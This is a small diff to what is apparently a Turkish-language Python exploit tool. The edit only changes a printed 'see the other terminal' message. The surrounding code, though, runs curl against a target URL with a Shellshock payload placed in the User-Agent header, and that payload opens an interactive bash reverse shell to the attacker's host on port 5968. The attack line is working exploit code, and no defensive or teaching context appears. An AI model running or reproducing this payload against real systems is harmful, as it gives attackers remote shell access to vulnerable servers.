@@ -27,5 +27,5 @@ ip = arg.lhost[0]
 if arg == ayr.parse_args():
 	os.system("clear")
 	print(banner)
-	print("\n\nDiğer Terminale Bakınız")
+	print("\n\n\nDiğer Terminale Bakınız\n")
 	os.system("""curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/"""+ ip + """/5968 0>&1' """ + url)
